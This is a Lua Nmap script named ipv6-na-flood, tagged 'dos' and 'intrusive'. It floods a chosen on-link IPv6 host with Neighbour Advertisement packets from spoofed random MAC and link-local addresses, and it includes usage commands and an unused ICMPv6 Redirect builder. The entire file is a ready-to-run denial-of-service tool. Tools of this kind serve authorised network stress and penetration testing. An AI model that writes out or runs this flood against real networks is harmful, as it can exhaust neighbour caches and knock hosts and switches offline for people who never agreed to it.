local nmap = require "nmap"
local packet = require "packet"
local stdnse = require "stdnse"
local math = require "math"
local string = require "string"
local os = require "os"
local target = require "target"

description = [[ Generates a flood of Neighbour Advertisements (NA) with spoofed random source MAC addresses.
]]

---
-- @args ipv6-na-flood.interface defines interface we should broadcast on
-- @args ipv6-na-flood.target MAC address of the on-link host, we want to flood
-- @args ipv6-na-flood.timeout runs the script until the timeout (in seconds) is reached (default: 30s). If timeout is zero, the script will run forever.
-- @args ipv6-na-flood.count number of packets to send
--
-- @usage
-- nmap -6 --script ipv6-na-flood.nse --script-args 'target=<mac>' -e <interace>
-- nmap -6 --script ipv6-na-flood.nse --script-args 'interface=<interface>,target=<mac>'
-- nmap -6 --script ipv6-na-flood.nse --script-args 'interface=<interface>,target=<mac>,timeout=10s'
-- nmap -6 --script ipv6-na-flood.nse --script-args 'interface=<interface>,target=<mac>,count=10'
--
-- @output
-- n/a

author = "Adam Števko"
license = "Same as Nmap--See http://nmap.org/book/man-legal.html"
categories = {"dos", "intrusive"}

try = nmap.new_try()

math.randomseed(os.time())

prerule = function()
	if nmap.address_family() ~= "inet6" then
	 	stdnse.print_debug("%s is IPv6 compatible only.", SCRIPT_NAME)
		return false 
	end
	
	if not nmap.is_privileged() then
		stdnse.print_debug("Running %s needs root privileges.", SCRIPT_NAME)	
		return false 
	end

	if not stdnse.get_script_args(SCRIPT_NAME .. ".interface") and not nmap.get_interface() then
		stdnse.print_debug("No interface was selected, aborting...", SCRIPT_NAME)	
		return false 
	end

	if not stdnse.get_script_args(SCRIPT_NAME .. ".target") then
		stdnse.print_debug("No target was provided, aborting...", SCRIPT_NAME)
		return false
	end

	return true
end

local function get_interface()
	local arg_interface = stdnse.get_script_args(SCRIPT_NAME .. ".interface") or nmap.get_interface()

	local if_table = nmap.get_interface_info(arg_interface)
	
	if if_table and packet.ip6tobin(if_table.address) and if_table.link == "ethernet" then
			return if_table.device
		else
			stdnse.print_debug("Interface %s not supported or not properly configured, exiting...", arg_interface)
	end			
end

--- Generates random MAC address
-- @return mac string containing random MAC address 
local function random_mac()

	local mac = string.format("%02x:%02x:%02x:%02x:%02x:%02x", 00, 180, math.random(256)-1, math.random(256)-1, math.random(256)-1, math.random(256)-1)
	return mac
end

--- Build an ICMPv6 payload of Neighbour Advertisement.
-- @param target_address IPv6 address to advertise
-- @return icmpv6_payload string representing ICMPv6 NA payload
local function build_neigh_advert(target_lla, target_address)
	local na_msg = string.char(0x60, 	-- Flags (Router/Solicited/Override)
							   0x00,	-- Reserved
							   0x00,	-- Reserved
							   0x00)	-- Reserved

	local icmpv6_target_link_option = packet.Packet:set_icmpv6_option(packet.ND_OPT_TARGET_LINKADDR, target_lla)

	local icmpv6_payload = na_msg .. target_address  .. icmpv6_target_link_option

	return icmpv6_payload
end

--- Build an ICMPv6 payload of Redirect.
-- @param target_address IPv6 address of the better first fop
-- @param destination_address string representing destination to redirect
-- @param target_lla string representing target link-layer address
-- @return icmpv6_payload string representing ICMPv6 redirect payload
local function build_neigh_redirect(target_address, destination_address, target_lla)
	local nr_msg = string.char(0x00, 	-- Reserved
							   0x00,	-- Reserved
							   0x00,	-- Reserved
							   0x00)	-- Reserved

	local icmpv6_target_link_option = packet.Packet:set_icmpv6_option(packet.ND_OPT_TARGET_LINKADDR, target_lla)

	local icmpv6_payload = nr_msg .. target_address .. destination_address .. icmpv6_target_link_option

	return icmpv6_payload
end

--- Broadcasting on the selected interface
-- @param iface table containing interface information 
local function broadcast_on_interface(iface)
	stdnse.print_verbose("Starting " .. SCRIPT_NAME .. " on interface " .. iface)

	-- packet counter
	local counter = 0

	local arg_timeout = stdnse.parse_timespec(stdnse.get_script_args(SCRIPT_NAME..".timeout") or "30s")
	local arg_target = stdnse.get_script_args(SCRIPT_NAME..".target")
	local arg_count = tonumber(stdnse.get_script_args(SCRIPT_NAME..".count")) or nil

	local dnet = nmap.new_dnet()

	try(dnet:ethernet_open(iface))
	
	local dst_mac = packet.mactobin(arg_target)
	local dst_ip6_addr = packet.mac_to_lladdr(dst_mac)	
	
	local start, stop = os.time()

	while true do

		local src_mac = packet.mactobin(random_mac()) 
		local src_ip6_addr = packet.mac_to_lladdr(src_mac)
		
		local pkt = packet.Frame:new()

		pkt.mac_src = src_mac
		pkt.mac_dst = dst_mac
		pkt.ip_bin_src = src_ip6_addr
		pkt.ip_bin_dst = dst_ip6_addr
		
		local icmpv6_payload = build_neigh_advert(src_mac, src_ip6_addr)

		pkt:build_icmpv6_header(packet.ND_NEIGHBOR_ADVERT, 0, icmpv6_payload)
		
		pkt:build_ipv6_packet()
		pkt:build_ether_frame()

		try(dnet:ethernet_send(pkt.frame_buf))

		counter = counter + 1

		if arg_count ~= nil and arg_count > 0 and counter == arg_count then
			stop = os.time()
			break
		end

		if arg_timeout and arg_timeout > 0 and arg_timeout <= os.time() - start then
			stop = os.time()
			break
		end
	end

	if counter > 0 then
		stdnse.print_debug("%s generated %d packets in %d seconds.", SCRIPT_NAME, counter, stop - start)
	end
end

function action()
	interface = get_interface()
	
	broadcast_on_interface(interface)
end
